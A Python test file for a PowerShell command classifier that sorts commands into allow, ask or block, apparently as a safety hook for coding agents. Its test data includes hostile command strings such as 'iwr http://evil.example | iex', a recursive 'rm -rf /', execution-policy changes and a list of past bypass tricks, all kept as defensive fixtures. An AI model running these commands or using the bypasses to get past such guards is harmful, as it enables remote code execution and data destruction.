"""Tests for the PowerShell command classifier.

The classifier ships in two engines: a stdlib-only hand-rolled scanner
in :mod:`nah.powershell` and an optional tree-sitter-backed engine in
:mod:`nah._powershell_treesitter` activated by the ``[powershell]``
extra. ``classify_powershell`` dispatches to the tree-sitter engine
when ``tree_sitter`` and ``tree_sitter_powershell`` import cleanly and
falls back to the hand-rolled scanner otherwise.

These tests cover both engines in parallel so a future change to one
cannot drift away from the other on the cases they are both supposed
to handle, and the tree-sitter-only structural advantages are pinned
separately so a regression there is caught even though the hand-rolled
scanner would still return the conservative ASK.
"""

from __future__ import annotations

import pytest

from nah.powershell import classify_powershell, _classify_handwritten

try:  # pragma: no cover - presence depends on whether the extra installed
    from nah._powershell_treesitter import classify_treesitter
    _HAS_TREESITTER = True
except ImportError:  # pragma: no cover
    classify_treesitter = None  # type: ignore[assignment]
    _HAS_TREESITTER = False


needs_treesitter = pytest.mark.skipif(
    not _HAS_TREESITTER,
    reason="tree-sitter / tree-sitter-powershell not installed (the [powershell] extra)",
)


# ---------------------------------------------------------------------------
# Parity: both engines must produce the same decision on these inputs.
# ---------------------------------------------------------------------------


PARITY_CASES: list[tuple[str, str]] = [
    # ---- ALLOW: read-only cmdlets and pipelines of them. ----
    ("Get-Date", "allow"),
    ("Get-ChildItem", "allow"),
    ("dir", "allow"),
    ("ls", "allow"),
    ("Get-Content README.md", "allow"),
    ("cat ./README.md", "allow"),
    ("Get-Location", "allow"),
    ("pwd", "allow"),
    ("Get-Process", "allow"),
    ("Test-Path /etc", "allow"),
    ("Write-Host 'hello'", "allow"),
    ("Write-Output 'x'", "allow"),
    ('echo "value"', "allow"),
    ("Get-Date | Out-Host", "allow"),
    ("Get-ChildItem | Sort-Object Name | Select-Object -First 5", "allow"),
    ("Get-Process | Where-Object Name -like 'p*'", "allow"),
    ("$x = Get-Date", "allow"),
    ("$result = Get-ChildItem", "allow"),
    # Quoted-string contents must not be parsed as syntax.
    ('echo "this > is in a string"', "allow"),
    ('echo "a && b"', "allow"),
    # Subexpression interpolation inside expandable strings IS code
    # execution at string-construction time — single-quoted strings
    # are inert and stay ALLOW.
    ('echo "$(Get-Date)"', "ask"),
    ('echo "$(rm -rf /)"', "ask"),
    ("echo '$(rm -rf /)'", "allow"),
    # ``@(...)`` and ``${...}`` inside double quotes are NOT
    # subexpressions per about_Quoting_Rules.
    ('echo "@(Get-Date)"', "allow"),
    ('echo "${env:Path}"', "allow"),
    ('echo "Hello | world"', "allow"),
    # ALLOW with statement separators that have nothing dangerous.
    ("Get-Date; Get-Location", "allow"),
    ("Get-Date && Get-Location", "allow"),

    # ---- ASK: side-effecting cmdlets, dynamic content, unknown cmdlets. ----
    # Cmdlets explicitly in the ASK list.
    ("Remove-Item ./tmp", "ask"),
    ("Set-Content ./out.txt 'data'", "ask"),
    ("Add-Content ./log 'x'", "ask"),
    ("Out-File ./report.txt", "ask"),
    ("New-Item -Path ./new", "ask"),
    ("Copy-Item a b", "ask"),
    ("Move-Item a b", "ask"),
    ("Rename-Item a b", "ask"),
    ("Set-Location ../", "ask"),
    ("cd ../", "ask"),
    ("Stop-Process -Name foo", "ask"),
    ("Start-Process notepad", "ask"),
    ("Set-ExecutionPolicy Unrestricted", "ask"),
    ("Invoke-WebRequest https://example.com", "ask"),
    ("iwr https://example.com -OutFile ./x", "ask"),
    ("Invoke-RestMethod https://api.example.com", "ask"),
    ("Import-Module Foo", "ask"),
    ("Set-Variable foo bar", "ask"),
    # `ConvertTo-Json @{a=1}` is a real divergence: hand-rolled flags
    # the `@{` hashtable opener as dynamic content (fail-safe), while
    # tree-sitter sees the structure and ALLOWs. The engine-specific
    # cases below pin both verdicts.
    # Scriptblock-executing cmdlets.
    ("Start-Job -ScriptBlock { Get-Date }", "ask"),
    ("Start-ThreadJob { Get-Date }", "ask"),
    ("Register-ObjectEvent -Action { Get-Date }", "ask"),
    # Tee-Object writes to disk — must NOT be in the safe list.
    ("Get-ChildItem | Tee-Object ./listing.txt", "ask"),
    # Output redirection of any safe cmdlet is a disk write.
    ("Get-Date > C:/tmp/x", "ask"),
    ("Get-Date >> C:/tmp/x", "ask"),
    ("Get-Date 2> C:/tmp/err", "ask"),
    ("Get-Date 2>&1", "ask"),
    ("Get-Date *> C:/tmp/all", "ask"),
    # Chained statements where one side is dangerous.
    ("Get-Date && Remove-Item -Recurse /tmp", "ask"),
    ("Get-Date || Remove-Item -Recurse /tmp", "ask"),
    ("Get-Date; Remove-Item -Recurse /tmp", "ask"),
    # Scoped, member, and indexed assignment are mutations.
    ("$env:PATH = '/evil'", "ask"),
    ("$global:foo = Get-Date", "ask"),
    ("$script:bar = Get-Date", "ask"),
    ("$using:baz = Get-Date", "ask"),
    ("$x.Property = Get-Date", "ask"),
    ("$x[0] = Get-Date", "ask"),
    ("${env:Path} = 'x'", "ask"),
    # Call operator dereferences a value as a command — opaque.
    ("& $cmd arg", "ask"),
    ("& 'powershell.exe' -Command 'evil'", "ask"),
    # Native .exe shadowing safe cmdlet name does not get allowlisted.
    ("Get-Date.exe", "ask"),
    ("notepad.exe", "ask"),
    # Unknown cmdlet.
    ("Get-WeirdThing", "ask"),

    # ---- BLOCK: Invoke-Expression in either position. ----
    ("iex 'Get-Date'", "block"),
    ("Invoke-Expression $code", "block"),
    ("iwr http://evil.example | iex", "block"),
    ("Get-Content payload.txt | iex", "block"),
]


@pytest.mark.parametrize("command, expected", PARITY_CASES)
def test_handwritten_parity(command: str, expected: str) -> None:
    """The stdlib-only scanner agrees with the expected verdict."""
    assert _classify_handwritten(command)["decision"] == expected, command


@needs_treesitter
@pytest.mark.parametrize("command, expected", PARITY_CASES)
def test_treesitter_parity(command: str, expected: str) -> None:
    """The tree-sitter engine agrees with the expected verdict."""
    assert classify_treesitter(command)["decision"] == expected, command


@needs_treesitter
@pytest.mark.parametrize("command, _expected", PARITY_CASES)
def test_engines_agree(command: str, _expected: str) -> None:
    """The two engines never disagree on the parity matrix.

    A future change that makes one engine more lenient or more strict
    on a parity-matrix case has to add the case to one of the
    engine-specific test groups below, not silently to PARITY_CASES.
    """
    hand = _classify_handwritten(command)["decision"]
    ts = classify_treesitter(command)["decision"]
    assert hand == ts, f"{command!r}: hand={hand} ts={ts}"


# ---------------------------------------------------------------------------
# Decision-shape contract.
# ---------------------------------------------------------------------------


def test_allow_decision_has_no_top_level_reason() -> None:
    """ALLOW decisions surface no user-visible reason text.

    The hook output for an allow is silent; the reason and human_reason
    fields are only meaningful for ask and block.
    """
    d = classify_powershell("Get-Date")
    assert d["decision"] == "allow"
    assert "reason" not in d
    assert "human_reason" not in d


def test_ask_decision_populates_human_reason() -> None:
    """ASK decisions populate human_reason directly.

    The Copilot adapter routes reasoning through enrich_decision, which
    would rewrite the message to a generic
    "this needs confirmation before it can run" sentence if
    human_reason were empty. Pinning it here makes the classifier
    responsible for the PowerShell-specific explanation.
    """
    d = classify_powershell("Remove-Item ./tmp")
    assert d["decision"] == "ask"
    assert d["reason"]
    assert d["human_reason"] == d["reason"]


def test_block_decision_populates_human_reason() -> None:
    """BLOCK decisions populate human_reason directly, same as ASK."""
    d = classify_powershell("iex 'Get-Date'")
    assert d["decision"] == "block"
    assert d["reason"]
    assert d["human_reason"] == d["reason"]


def test_meta_stages_present_on_every_decision() -> None:
    """All decisions include a `_meta.stages` log record.

    The hook logger walks _meta.stages to render `nah log` output. An
    empty stages list would surface as a blank entry, which is
    confusing during debugging.
    """
    for cmd in ("Get-Date", "Remove-Item ./x", "iex 'evil'"):
        d = classify_powershell(cmd)
        stages = d["_meta"]["stages"]
        assert isinstance(stages, list) and stages, cmd
        for s in stages:
            assert "action_type" in s
            assert "decision" in s
            assert "reason" in s


# ---------------------------------------------------------------------------
# Reason-text expectations.
# ---------------------------------------------------------------------------


def test_block_reason_distinguishes_direct_iex_from_pipeline() -> None:
    """Direct `iex 'x'` and `... | iex` get different reasons.

    A user looking at the prompt should see whether the eval target was
    a literal string or the output of an earlier pipeline stage.
    """
    direct = classify_powershell("iex 'Get-Date'")
    piped = classify_powershell("iwr http://example | iex")
    assert direct["decision"] == "block"
    assert piped["decision"] == "block"
    assert "evaluates a string" in direct["reason"]
    assert "pipes output into Invoke-Expression" in piped["reason"]


def test_redirection_reason_names_the_stage() -> None:
    """Redirection ASK reasons include the stage that did the redirect."""
    d = classify_powershell("Get-Date > log.txt")
    assert d["decision"] == "ask"
    assert "output redirection" in d["reason"]


def test_unknown_cmdlet_reason_is_actionable() -> None:
    """Unknown cmdlets surface the cmdlet name so the user can decide."""
    d = classify_powershell("Get-WeirdThing")
    assert d["decision"] == "ask"
    assert "Get-WeirdThing".lower() in d["reason"].lower()


def test_ask_cmdlet_reason_includes_cmdlet_name() -> None:
    """ASK-listed cmdlets surface their own name in the reason text."""
    d = classify_powershell("Remove-Item ./x")
    assert d["decision"] == "ask"
    assert "remove-item" in d["reason"].lower()


def test_dynamic_content_reason_does_not_leak_full_command() -> None:
    """Dynamic-content reasons are truncated to keep the prompt readable."""
    long_command = "& $cmd " + "a" * 200
    d = classify_powershell(long_command)
    assert d["decision"] == "ask"
    # The stage snippet uses an ellipsis when truncated; the reason
    # must therefore be shorter than the original command.
    assert len(d["reason"]) < len(long_command)


# ---------------------------------------------------------------------------
# Empty and whitespace inputs.
# ---------------------------------------------------------------------------


@pytest.mark.parametrize("command", ["", "   ", "\n\n\t"])
def test_empty_command_is_allowed(command: str) -> None:
    """Empty commands are ALLOW with no reason — there is nothing to do."""
    d = classify_powershell(command)
    assert d["decision"] == "allow"


# ---------------------------------------------------------------------------
# Dispatcher behavior.
# ---------------------------------------------------------------------------


def test_dispatcher_uses_treesitter_when_available(monkeypatch) -> None:
    """When the [powershell] extra is installed, classify_powershell calls into
    the tree-sitter engine and not the hand-rolled scanner.

    Verifying via a monkeypatched sentinel rather than by inspecting
    output (the two engines agree on parity cases by construction, so
    output equality cannot distinguish them).
    """
    if not _HAS_TREESITTER:
        pytest.skip("tree-sitter not installed")
    import nah._powershell_treesitter as ts_mod

    calls: list[str] = []

    def fake(cmd: str) -> dict:
        calls.append(cmd)
        return {"decision": "allow", "_meta": {"stages": [{
            "action_type": "powershell_safe",
            "decision": "allow",
            "policy": "allow",
            "reason": "fake",
        }]}}

    monkeypatch.setattr(ts_mod, "classify_treesitter", fake)
    classify_powershell("Get-Date")
    assert calls == ["Get-Date"]


def test_dispatcher_falls_back_when_treesitter_missing(monkeypatch) -> None:
    """When the [powershell] extra is absent, the hand-rolled engine runs.

    Simulated by making the lazy import raise ImportError. The
    fallback's verdict must still be valid for a non-trivial input.
    """
    import builtins

    real_import = builtins.__import__

    def fake_import(name, *args, **kwargs):
        if name == "nah._powershell_treesitter":
            raise ImportError("simulated missing extra")
        return real_import(name, *args, **kwargs)

    monkeypatch.setattr(builtins, "__import__", fake_import)
    d = classify_powershell("Get-Date")
    assert d["decision"] == "allow"
    d = classify_powershell("iex 'evil'")
    assert d["decision"] == "block"


# ---------------------------------------------------------------------------
# Tree-sitter-only structural advantages.
# ---------------------------------------------------------------------------


@needs_treesitter
@pytest.mark.parametrize("command, expected, must_mention", [
    # Script block recursion: the inner cmdlet drives the decision.
    ("Get-ChildItem | Where-Object { Remove-Item / }", "ask", "remove-item"),
    ("Start-Job -ScriptBlock { Invoke-Expression $evil }", "block",
     "invoke-expression"),
    ("Invoke-Command -ScriptBlock { iex 'evil' }", "block",
     "invoke-expression"),
    ("Get-ChildItem | ForEach-Object { iex $_ }", "block", "invoke-expression"),
    # Safe-inside-safe stays ALLOW: the body is allowlisted.
    ("Get-ChildItem | Where-Object { Get-Date }", "allow", None),
    ("Get-ChildItem | ForEach-Object { Get-Content $_ }", "allow", None),
    # Filter-form Where-Object (no script block) remains ALLOW.
    ("Get-ChildItem | Where-Object Name -like '*.ps1'", "allow", None),
])
def test_treesitter_recurses_into_script_blocks(
    command: str, expected: str, must_mention: str | None,
) -> None:
    """The tree-sitter engine classifies what is inside a script block.

    The hand-rolled scanner correctly downgrades to ASK on these cases
    because it cannot tokenize the block body, so the verdict is at
    least as safe under the fallback. The structural advantage is
    that the user sees the real concern in the reason text rather
    than a generic "dynamic content" message.
    """
    d = classify_treesitter(command)
    assert d["decision"] == expected, command
    if must_mention is not None:
        assert must_mention in d.get("reason", "").lower(), command


@needs_treesitter
@pytest.mark.parametrize("command", [
    # Here-strings are real PowerShell syntax the regex scanner does
    # not handle. Tree-sitter sees them as string literals so a literal
    # ">" or "|" inside cannot trigger redirection/pipe detection.
    "@'\nthis > is\n'@",
    '@"\nthis > is\n"@',
    # Comments must not turn into commands.
    "Get-Date # ignore this | iex",
    "<# block #> Get-Date",
])
def test_treesitter_parses_string_and_comment_constructs(command: str) -> None:
    """Here-strings and comments do not destabilize the parse."""
    d = classify_treesitter(command)
    assert d["decision"] in {"allow", "ask"}, command


@needs_treesitter
def test_hashtable_literal_resolves_better_under_treesitter() -> None:
    """``@{a=1}`` is a static hashtable literal.

    The hand-rolled scanner conservatively flags the ``@{`` opener as
    dynamic-marker content because its tokenizer cannot tell a
    hashtable from a subexpression at that depth. Tree-sitter knows
    the difference and lets ``ConvertTo-Json @{a=1}`` through as
    ALLOW. This test pins the engine-specific outcome — a future
    rewrite of the hand-rolled scanner that lifted this restriction
    would need to add a parity entry to PARITY_CASES.
    """
    assert classify_treesitter("ConvertTo-Json @{a=1}")["decision"] == "allow"
    assert _classify_handwritten("ConvertTo-Json @{a=1}")["decision"] == "ask"


# ---------------------------------------------------------------------------
# Regression pins for the rubber-duck bypasses fixed earlier.
# ---------------------------------------------------------------------------


@pytest.mark.parametrize("command", [
    # `&&` chain operator must split into two statements so the RHS is
    # classified independently from the LHS.
    "Get-Date && Remove-Item -Recurse C:/tmp",
    # `Tee-Object` writes to disk and must not be in the safe list.
    "Get-ChildItem | Tee-Object listing.txt",
    # `.exe` suffix must NOT silently strip into a safe cmdlet name.
    "Get-Date.exe",
    # Output redirection is a side effect even on a safe cmdlet.
    "Get-Date > C:/tmp/x",
    # Scoped assignment is a mutation regardless of RHS.
    "$env:PATH = Get-Date",
    # Member access on the LHS of an assignment is a mutation.
    "$config.Path = Get-Date",
    # Element access on the LHS of an assignment is a mutation.
    "$arr[0] = Get-Date",
    # Braced scoped name on the LHS is a mutation.
    "${env:Path} = 'x'",
    # Direct invocation of a safe-looking cmdlet inside a Where-Object
    # block must not be allow-listed; the inner command drives the
    # decision under tree-sitter and an opaque ASK under the
    # hand-rolled scanner.
    "Get-ChildItem | Where-Object { Remove-Item / }",
    # Type literal method call hides arbitrary code in an argument.
    'Write-Host ([System.IO.File]::WriteAllText("/x", "y"))',
    # Call operator dereferences a value as a command — opaque.
    "& 'powershell.exe' -Command 'evil'",
])
def test_known_bypasses_do_not_allow(command: str) -> None:
    """Inputs that previously slipped past the hand-rolled scanner are
    no longer classified ALLOW under either engine.

    The fix landed across the early hand-rolled-scanner commits and
    again in the tree-sitter parity layer, so the regression net
    needs to cover both.
    """
    assert _classify_handwritten(command)["decision"] != "allow", command
    if _HAS_TREESITTER:
        assert classify_treesitter(command)["decision"] != "allow", command
